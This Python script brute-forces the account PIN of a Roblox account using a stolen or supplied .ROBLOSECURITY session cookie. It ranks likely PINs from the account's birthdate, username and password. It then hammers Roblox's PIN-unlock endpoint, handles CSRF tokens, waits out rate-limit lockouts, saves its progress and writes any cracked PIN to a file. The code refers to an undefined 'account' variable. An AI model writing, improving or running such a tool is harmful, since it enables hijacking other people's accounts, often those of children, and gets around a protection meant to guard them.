import time
import requests
from threading import Thread
from os import path
import json

# Check config.py
try:
    import config
except ImportError as e:
    if path.isfile('config.py'):
        raise
    else:
        raise ImportError('[FAILURE] The config.py file could not be found. Make sure you have made a config.py file using config-template.py.')

# Check for internet connection
try:
    _ = requests.head('https://8.8.8.8', timeout=5)
except requests.ConnectionError:
    raise Exception("[FAILURE] No internet connection. Please connect to the internet.")

# Validate cookie and get user info
req = requests.Session()
req.cookies['.ROBLOSECURITY'] = config.cookie
try:
    r = req.get('https://www.roblox.com/mobileapi/userinfo').json()
    userid = r['UserID']
except:
    raise Exception('[FAILURE] The cookie provided is invalid. Please correct it in your config.py file.')

print('[INFO] Logged in.\n')

# Check for pins.json
if path.isfile(f'{config.username}-pins.json'):
    # Load pins file
    file = open(f'{config.username}-pins.json', 'r')
    pins = json.loads(file.read())
    file.close()
    # Check for progress file
    if path.isfile(f'{config.username}-progress.json'):
        file = open(f'{config.username}-progress.json', 'r')
        progress = int(file.read())
        del pins[:progress]
    else:
        progress = 0
else:
    # Get most common PINs
    r = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
    pins = [x.split(',')[0] for x in r.splitlines()]
    print('[INFO] Loaded most common pins.')

    r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
    month = str(r['birthMonth']).zfill(2)
    day = str(r['birthDay']).zfill(2)
    year = str(r['birthYear'])

    likely = [config.username[:4], config.password[:4], config.username[:2]*2, config.password[:2]*2, config.username[-4:], config.password[-4:], config.username[-2:]*2, config.password[-2:]*2, year, day+day, month+month, month+day, day+month]
    likely = [x for x in likely if x.isdigit() and len(x) == 4]
    for pin in likely:
        pins.remove(pin)
        pins.insert(0, pin)

    print(f'[INFO] Prioritized likely pins.\n')

    # Write pins to pins.json for future use
    file = open(f'{config.username}-pins.json', 'w')
    file.write(json.dumps(pins))
    file.close()


sleep = 0
tried = 0

while 1:
    pin = pins.pop(0)
    print(f'[INFO] Trying PIN #{progress+tried+1}: {pin}')
    try:
        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
        if 'X-CSRF-TOKEN' in r.headers:
            pins.insert(0, pin)
            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
        elif 'errors' in r.json():
            code = r.json()['errors'][0]['code']
            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                print(f'[FAILURE] Account cookie expired. Please enter a new cookie in config.py.')
                print('[INFO] Progress has been saved.')
                exit()
            elif code == 1:
                print(f'[SUCCESS] No PIN is set in the account. It has been saved to cracked.txt.')
                with open('cracked.txt','a') as f:
                    f.write(f'{account}: No PIN\n')
                break
            elif code == 3:
                pins.insert(0, pin)
                sleep += 1
                if sleep == 5:
                    sleep = 0
                    time.sleep(300)
            elif code == 4:
                tried += 1
                file = open(f'{config.username}-progress.json', 'w')
                file.write(str(progress+tried))
                file.close()
        elif 'unlockedUntil' in r.json():
            print(f'[SUCCESS] PIN is {pin}. PIN has been saved to cracked.txt.')
            with open('cracked.txt','a') as f:
                f.write(f'{account}: {pin}\n')
            break
        else:
            print(f'[FAILURE] {r.text}')
            pins.append(pin)
    except Exception as e:
        print(f'[FAILURE] {e}')
        pins.append(pin)
